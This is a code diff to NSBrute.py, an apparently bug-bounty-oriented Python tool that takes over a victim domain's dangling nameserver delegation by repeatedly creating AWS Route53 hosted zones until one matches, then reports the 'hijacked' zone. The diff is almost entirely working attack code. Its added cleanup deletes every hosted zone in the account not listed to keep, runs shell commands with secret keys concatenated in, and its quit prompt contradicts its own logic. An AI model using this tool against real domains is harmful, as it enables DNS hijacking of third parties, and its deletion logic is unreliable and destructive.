@@ -3,6 +3,9 @@ import sys
 import time
 import traceback
 import dns.resolver
+import subprocess
+import json
+import ast
 
 accessKey=""
 secretKey=""
@@ -50,8 +53,9 @@ def myPrint(text, type):
 	if(type=="SECURE"):
 		print bcolors.OKGREEN+bcolors.BOLD+text+bcolors.ENDC
 
-#python NSTakeover.py -d domain -a accessKey -s secretKey -ns a,b,c,d
+#python NSBrute.py -d domain -a accessKey -s secretKey -ns a,b,c,d -k '["zone_id_to_keep_1", "zone_id_to_keep_2"]'
 
+zones_to_keep = []
 
 if (len(sys.argv)<7):
 	myPrint("Please provide the required arguments to initiate scanning.", "ERROR")
@@ -66,6 +70,9 @@ if (sys.argv[3]=="-a" or sys.argv[3]=="--accessId"):
 	accessKey=sys.argv[4]
 if (sys.argv[5]=="-s" or sys.argv[5]=="--secretKey"):
 	secretKey=sys.argv[6]
+if len(sys.argv) >= 8:
+	if (sys.argv[7]=="-k" or sys.argv[7]=="--zonesToKeep"):
+		zones_to_keep =  ast.literal_eval(sys.argv[8])
 try:
 	nsRecords = dns.resolver.query(victimDomain, 'NS')
 except:
@@ -88,45 +95,99 @@ conn = route53.connect(
     aws_access_key_id=accessKey,
     aws_secret_access_key=secretKey,
 )
-#While modifying the script if something goes wrong and you accidently end up creating shit loads of Zones you might need this logic for automated deletion of zones
-# i=0
-# listOfZoneIDs=[""]
-# for zoneId in listOfZoneIDs:
-# 	zone=conn.get_hosted_zone_by_id(zoneId)
-# 	zone.delete()
-# 	print i
-# 	i=i+1
 
+created_zones = []
+successful_zone = []
 counter=0
-while True:
-	counter=counter+1
-	myPrint("Iteration Count: "+str(counter),"INFO_WS")
-	try: 
-		new_zone=0
-		new_zone, change_info = conn.create_hosted_zone(
-	    victimDomain, comment='zaheck'
-		)
-		#Erroneous Condition
-		if new_zone is None:
+try:
+
+	while True:
+		counter=counter+1
+		myPrint("Iteration Count: "+str(counter),"INFO_WS")
+		try: 
+			new_zone=0
+			new_zone, change_info = conn.create_hosted_zone(
+			# in honor of bagipro, we love your reports, we hope you never stop researching and participating in bug bounty
+		    victimDomain, comment='zaheck'
+			)
+			hosted_zone_id = new_zone.__dict__["id"]
+			created_zones.append(hosted_zone_id)
+			#Erroneous Condition
+			if new_zone is None:
+				continue
+			nsAWS=new_zone.nameservers
+			myPrint("Created a new zone with following NS: ","INFO_WS")
+			myPrint(" ".join(nsAWS),"INFO_WS")
+			intersection=set(nsAWS).intersection(set(targetNS))
+			if(len(intersection)==0):
+				myPrint("No common NS found, deleting new zone","ERROR")
+				print ""
+				new_zone.delete()
+			else:
+				myPrint("Successful attempt after "+str(counter)+" iterations.","SECURE")
+				myPrint("Check your AWS account, the work is done!","SECURE")
+				print "This is the hijacked Zone ID: " + str(hosted_zone_id)
+				hijacked_zone = next(iter(intersection))
+				print "This is the zone you hijacked: " + str(hijacked_zone)
+				successful_zone.append(hosted_zone_id)
+				created_zones.remove(hosted_zone_id)
+				print ""
+				break
+		except Exception as e:
+			myPrint("Exceptional behaviour observed while creating the zone.", "ERROR")
+			myPrint("Trying Again!","ERROR")
+			if new_zone != 0:
+				new_zone.delete()
 			continue
-		nsAWS=new_zone.nameservers
-		myPrint("Created a new zone with following NS: ","INFO_WS")
-		myPrint("".join(nsAWS),"INFO_WS")
-		intersection=set(nsAWS).intersection(set(targetNS))
-		if(len(intersection)==0):
-			myPrint("No common NS found, deleting new zone","ERROR")
-			print ""
-			new_zone.delete()
-		else:
-			myPrint("Successful attempt after "+str(counter)+" iterations.","SECURE")
-			myPrint("Check your AWS account, the work is done!","SECURE")
-			print ""
-			exit(0)
-	except Exception as e:
-		myPrint("Exceptional behaviour observed while creating the zone.", "ERROR")
-		myPrint("Trying Again!","ERROR")
-		if new_zone != 0:
-			new_zone.delete()
-		continue
 
+except KeyboardInterrupt:
+	quit = raw_input("Would you like to quit without having deleted all hosted zones? Put 'y' if you want to quit now without having deleted all hosted zones. Put any other sequence of characters to quit immediately: ")
+	if len(created_zones) != 0 and quit == "y":
+		command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 list-hosted-zones"
+		out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+		stdout,stderr = out.communicate()
+		json_data = None
 
+		if stdout != 'false':
+			json_data = json.loads(stdout)
+		
+		remaining_zones = []
+		
+		for zone in json_data["HostedZones"]:
+			remaining_zones.append(str(zone["Id"].replace("/hostedzone/","")))
+		
+		for zone in zones_to_keep:
+			remaining_zones.remove(zone)
+
+		if len(successful_zone) != 0:
+			remaining_zones.remove(successful_zone[0])
+
+		for zone in remaining_zones:
+			command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 delete-hosted-zone --id " + str(zone)
+			out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+			stdout,stderr = out.communicate()
+
+	else:
+		exit()
+
+command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 list-hosted-zones"
+out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+stdout,stderr = out.communicate()
+json_data = None
+
+if stdout != 'false':
+	json_data = json.loads(stdout)
+remaining_zones = []
+for zone in json_data["HostedZones"]:
+	remaining_zones.append(str(zone["Id"].replace("/hostedzone/","")))
+
+for zone in zones_to_keep:
+	remaining_zones.remove(zone)
+
+if len(successful_zone) != 0:
+	remaining_zones.remove(successful_zone[0])
+
+for zone in remaining_zones:
+	command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 delete-hosted-zone --id " + str(zone)
+	out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+	stdout,stderr = out.communicate()
